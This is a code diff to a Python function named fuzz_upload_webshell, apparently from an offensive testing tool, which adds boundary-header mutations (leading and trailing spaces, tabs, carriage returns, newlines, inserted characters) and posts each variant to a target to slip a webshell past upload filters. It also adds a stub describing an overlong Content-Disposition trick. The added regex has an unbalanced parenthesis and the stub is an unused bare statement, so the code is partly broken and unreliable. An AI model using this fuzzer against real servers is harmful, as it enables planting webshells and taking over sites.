@@ -345,6 +345,7 @@ def fuzz_upload_webshell():
             'content_type': work_content_type+chr(i)}}
         fuzz_content_type.append(item)
 
+    # 修改filename
     for filename_item in fuzz_file_name:
         # filename变,其他不变
         # 只修改filename,不修改content-type,content-type为jpg,gif,png,txt,xxx中可以正常上传的一种
@@ -354,6 +355,7 @@ def fuzz_upload_webshell():
         rsp = post_multipart_form_data(packet)
         check_upload_succeed(rsp, origin_html)
 
+    # 修改content-type
     for content_type_item in fuzz_content_type:
         # content-type和file_content变,其他不变
         # 只修改content-type,不修改filename,filename为固定的webshell后缀的文件名,file_content随着content-type而改变
@@ -377,6 +379,30 @@ def fuzz_upload_webshell():
         rsp = post_multipart_form_data(packet)
         check_upload_succeed(rsp, origin_html)
 
+    # 修改header中的boundary
+    fuzz_boundary=[
+            {'desc':"header中的boundary值前加空格",'modify':{'boundary':" "+boundary}},
+            {'desc':"header中的boundary值后加空格",'modify':{'boundary':boundary+" "}},
+            {'desc':"header中的boundary值前加水平制表符",'modify':{'boundary':"\x09"+boundary}},
+            {'desc':"header中的boundary值后加水平制表符",'modify':{'boundary':boundary+"\x09"}},
+            {'desc':"header中的boundary值前加垂直制表符",'modify':{'boundary':"\x0b"+boundary}},
+            {'desc':"header中的boundary值后加垂直制表符",'modify':{'boundary':boundary+"\x0b"}},
+            {'desc':"header中的boundary值前加回车",'modify':{'boundary':"\x0d"+boundary}},
+            {'desc':"header中的boundary值后加回车",'modify':{'boundary':boundary+"\x0d"}},
+            {'desc':"header中的boundary值前加换行",'modify':{'boundary':"\x0a"+boundary}},
+            {'desc':"header中的boundary值后加换行",'modify':{'boundary':boundary+"\x0a"}},
+            {'desc':"header中的boundary值中间加上一些字符如----------11111111newstringhere111111",'modify':{'boundary':boundary[:-1]+"ddd"+boundary[-1]}},
+    ]
+    for boundary_item in fuzz_boundary:
+        print(boundary_item['desc'])
+        packet=re.sub(r"(?<=Content-Type: multipart/form-data; boundary=)[^\r\n]+)",boundary_item['modify']['boundary'],work_packet)
+        rsp = post_multipart_form_data(packet)
+        check_upload_succeed(rsp, origin_html)
+
+    # 修改Content-Disposition使filename字段前有超长内容
+    {'desc':'修改Content-Disposition中的name字段的值,在name后面加超长字符,如Content-Disposition: form-data; name="uploaded"dddddd(超长d)dddd; filename="test.php"','modify':{}}
+
+    # 修改filename且修改content-type
     for filename_item in fuzz_file_name:
         for content_type_item in fuzz_content_type:
             print(filename_item['desc']+"  &&  "+content_type_item['desc'])
